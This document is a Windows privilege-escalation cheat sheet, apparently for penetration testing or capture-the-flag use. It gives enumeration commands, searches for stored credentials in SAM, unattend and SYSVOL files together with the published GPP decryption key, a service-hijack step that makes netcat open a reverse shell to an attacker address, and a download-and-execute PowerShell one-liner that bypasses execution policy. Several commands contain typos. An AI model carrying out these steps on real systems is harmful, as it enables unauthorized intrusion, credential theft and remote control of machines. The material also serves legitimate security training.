# Windows Privilege Escalation 
This cheat sheet contains the flow chart methodology that can be used to test Windows privilege escalation.
## System Information Gathering
Use the following steps to gather basic system information once we get a low privilege shell on a Micorsoft Windows system.
### All System Info
To get system information, try the following DOS command,
```
C:> systeminfo
```
### User Info
We can get a list of users with the following command,
```
C:> net user
C:> net user (USERNAME)
C:> whoami /priv
C:> whoami /all
C:> net accounts
C:> net localgroup
C:> Get-LocalGroup | ft Name
```
### Network Information
We can use DOS to gather network information from the comrpomised taregt Microsoft Windows machine with the following DOS commands,
```
C:> ipconfig /all
C:> route print
C:> arp -A
C:> netstat -ano
C:> netsh firewall show state
C:> netsh firewall show config
C:> netsh advfirewall firewall dump
C:> net share
```
Powershell,
```
PS> Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
PS> Get-DnsClientServerAddress -AddressFamily IPv4 | ft
PS> Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
PS> Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
```
### Scheduled Tasks
Micorosft Windows might have scheduled tasks which we can leverge depending on the task, permissions, the files it accesses and their permissions, and how oftne the task runs. Use the followinf DOS command to gather scheduled task information from Microsoft Windows,
```
C:> schtasks /query /fo LIST /v
C:> tasklist /SVC
C:> net start
```
### Drivers
Some drivers might have vulnerabilities. We can list the drivers used on a Microsoft Windows system with the following DOS command,
```
C:> DRIVERQUERY
```
### Missing Patches
To get the patch information for Microsoft Windows systems, we can us `wmic` as shown below.
```
C:> wmic qfe get Caption, Description, HotFixID, InstalledOn
C:> wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."
```
Then do a search in Exploit-DB with `searchsploit` in Kali Linux.
## Browser Credentials
Browser credentials could lead to escalation if the credentials are reused on other systems and services. 

### PowerUp
The [PowerUp Power Shell script](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) PowerSploit module can be used to search for injectable DLLs, service permissions, autologin credentials, web configuration credentials and many other areas of the OS and FS that can be used specifically for privilege escalation.

### AlwaysInstallElevated
This option in the Windows registry will aloow us to execute a binary that does `execv()` and adds an admin user no matter what privilege we current are. This will only work if both registry keys contain "AlwaysInstallElevated" with DWORD values of 1.
```
C:\Windows\system32> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
C:\Windows\system32> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
```
### RunAs
You can try the `runas` command with the `/savecred` in hopes that an admin credential has been saved for scripting purposes. For instance, spawn a new shell and write the contents of a protected file to one that you can read, like so,
```
C:\> runas /savecred /user:Administrator "cmd.exe /c type C:\Users\Administrator\Desktop\flag.txt > C:\Users\PwnedUser\Desktop\flag.txt"
```
If the credentials are in fact stored, you will get a new file in the pwned user's desktop called "flag.txt"

### WMIC
Windows Management Instrumentation Console can sometimes be leveraged for privilege escalation.

### Mass Install of Windows to Labs
Sometimes the mass-install process of many Microsoft Windows machines in the same environment can leave behind log files with sensitive information in them. We can check a few of these files if they exist on the file system onthe compromised target Windows machine,
```
c:\sysprep.inf
c:\sysprep\sysprep.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml
```
### Groups.xml
If we have access to the SYSVOL/groups.xml file, we have access to any passwords encrypted in there. When a new GPP is created, there’s an associated XML file created in SYSVOL with the relevant configuration data and if there is a password provided, it is AES-256 bit encrypted. 

Since authenticated users (any domain user or users in a trusted domain) have read access to SYSVOL, anyone in the domain can search the SYSVOL share for XML files containing “cpassword” which is the value that contains the AES encrypted password.
```
C:> findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
```
The AES decryption key, published by Microsoft themselves, is,
```
4e 99 06 e8  fc b6 6c c9  fa f4 93 10  62 0f fe e8	
f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b
```
There is a PowerSploit Power Shell script that we can use to automate the password reveal [located here.](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1)

### Mass Credentials Search
Below are a few searches that we can do in our DOS prompt for searching for credentials that are stored in files.
```
C:> dir /s *pass* == *cred* == *vnc* == *.config*
C:> findstr /si password *.xml *.ini *.txt
C:> reg query HKLM /f password /t REG_SZ /s
C:> reg query HKCU /f password /t REG_SZ /s
```
We can check the following files for credentials
```
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
Unattend XML Files may contain passwords also,
```
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```
WiFi Passwords
```
C:> netsh wlan show profile
C:> netsh wlan show profile (SSID) key=clear
```
### Windows Services
Next, we can try Microsoft Windows Services with the following command,
```
C:> sc qc Sploiler
```
If we upload a copy of the `accesschk.exe` binary from [Microsoft SysInternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) we can check alot of permissions for services. For instance,
```
C:> accesschk.exe /accepteula -ucqv Spooler
```
will list the Spooler service and it's permissions. To list all services, simply use an asterisk,
```
C:> accesschk.exe /accepteula -ucqv *
```
We can use it to check for write access to a service with the following DOS command,
```
C:> accesschk.exe /accepteula -uwcqv "Authenticated Users" *
```
Now, let's try it in practice. First a few things need to be in order. We must,
1. Have a space to read and write 
2. Upload the Windows binary of Netcat to the target `/usr/share/binaries/windows` in Kali.
```
C:\> sc qc upnphost
C:\> sc config upnphost binpath= "C:\temp\nc.exe -nv (ATTACKER IP ADDRESS) (ATTACKER PORT) -e C:\WINDOWS\System32\cmd.exe"
C:\> sc config upnphost obj= ".\LocalSystem" password= ""
C:\> sc qc upnphost
C:\> net start upnphost # start the service
```
The access rights that we are looking for in the service to fully exploit it are,
* SERVICE_SHNAGE_CONFIG
* WRITE_DAC
* WRITE_OWNER
* GENERIC_WRITE
* GENERIC_ALL
The important thing to remember is that we find out what user groups our compromised session belongs to. As mentioned previously "Power Users" is also considered to be a low privileged user group. "Power Users" have their own set of vulnerabilities, Mark Russinovich has written a very interesting article on the subject.
### Windows Processes
We can gather information on the currently-running processes with the following commands,
```
C:> tasklist /v
C:> tasklist /v /fi "username eq system"
C:> net start
C:> sc query
PS> Get-Service
PS> Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
PS> REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion
```
Search for weak services using [PowerUp Power Shell](https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps) script,
```
powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
```
### Weak File Permissions
We can also use `accesschk.exe` to determine which files in the target system have weak permissions like so,
```
C:> accesschk.exe -uwdqs Users c:\
C:> accesschk.exe -uwdqs "Authenticated Users" c:\
C:> accesschk.exe -uwqs Users c:\*.*
C:> accesschk.exe -uwqs "Authenticated Users" c:\*.*
```
# References
In this document, I referenced the following resources,
* [*http://www.fuzzysecurity.com/tutorials/16.html*](http://www.fuzzysecurity.com/tutorials/16.html)
